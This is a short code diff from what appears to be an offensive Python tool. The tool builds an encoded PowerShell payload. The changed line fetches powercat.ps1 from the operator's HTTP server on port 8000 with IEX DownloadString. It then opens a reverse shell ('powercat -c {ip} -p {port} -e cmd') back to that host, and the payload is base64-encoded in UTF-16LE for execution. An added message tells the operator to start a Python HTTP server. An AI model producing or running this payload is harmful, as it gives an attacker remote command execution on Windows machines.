@@ -30,7 +30,8 @@ def Main():
             with open("powercat.ps1", 'w', encoding = 'utf-8') as f:
                 f.write(r.text)
                 f.close()
-        rev = f"""IEX(New-Object Net.WebClient).DownloadString('http://{ip}/powercat.ps1');powercat -c {ip} -p {port} -e cmd"""
+        rev = f"""IEX(New-Object Net.WebClient).DownloadString('http://{ip}:8000/powercat.ps1');powercat -c {ip} -p {port} -e cmd"""
+        print("[*] Please start your python http server on port 8000, i will fix this issue later")
         payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
         return payload
     
